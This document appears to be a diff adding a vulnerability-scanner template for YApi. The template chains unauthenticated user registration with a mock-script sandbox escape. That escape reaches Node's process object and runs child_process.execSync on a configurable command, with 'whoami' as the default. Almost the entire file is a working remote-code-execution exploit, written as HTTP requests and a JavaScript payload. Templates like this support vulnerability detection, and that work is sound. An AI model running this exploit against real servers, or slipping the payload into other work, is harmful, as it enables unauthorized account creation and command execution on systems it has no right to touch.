@@ -1,0 +1,56 @@
+id: yapi-unauthorized-creation-user-and-mock-rce
+
+info:
+  name: YApi Unauthorized Creation User And Mock RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yapi allows unauthorized account creation and task assignment. This exploitation can lead to remote command execution.
+  reference:
+    - https://github.com/YMFE/yapi/issues/2099
+
+variables:
+  email: "YApi@gmail.com"
+  password: "YApi"
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: create-user
+    method: POST
+    path:
+      - "{{BaseURL}}/api/user/reg"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "{{email}}",
+        "password": "{{password}}",
+        "username": "{{password}}"
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{{password}}"
+        part: body
+
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/api/plugin/advmock/save"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "project_id": "1",
+        "interface_id": "1",
+        "mock_script": "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{{cmd}}\").toString()",
+        "enable": true
+      }
+    matchers:
+      - type: status
+        status: [200]
